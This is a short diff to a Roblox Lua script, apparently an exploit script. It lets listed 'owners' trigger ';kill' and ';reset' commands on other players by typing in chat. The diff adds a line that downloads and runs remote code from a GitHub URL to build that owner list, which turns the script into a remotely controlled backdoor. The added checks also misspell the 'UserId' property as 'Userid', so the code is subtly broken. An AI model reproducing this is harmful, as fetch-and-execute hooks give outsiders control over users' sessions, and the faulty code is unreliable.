@@ -1,5 +1,5 @@
 local lplr = game:GetService("Players").LocalPlayer
-local OWNERID = lplr.UserId
+local whitelist = loadstring(game:HttpGet("https://raw.githubusercontent.com/SomeRandomKid7/CustomV4/main/Whitelist.lua"))()
 
 local funcs = {}
 function funcs:kill()
@@ -183,7 +183,7 @@ end
 
 for i,v in pairs(game:GetService("Players"):GetChildren()) do
    v.Chatted:Connect(function(a) 
-        if v.UserId == OWNERID then
+        if table.find(whitelist.owners,v.Userid) then
           if a == ";kill" then
             funcs:kill()
           elseif a == ";reset" then
@@ -230,7 +230,7 @@ for i,v in pairs(game:GetService("Players"):GetChildren()) do
 end
 game:GetService("Players").PlayerAdded:Connect(function(v)
      v.Chatted:Connect(function(a) 
-        if v.UserId == OWNERID then
+        if table.find(whitelist.owners,v.Userid) then
           if a == ";kill" then
             funcs:kill()
           elseif a == ";reset" then
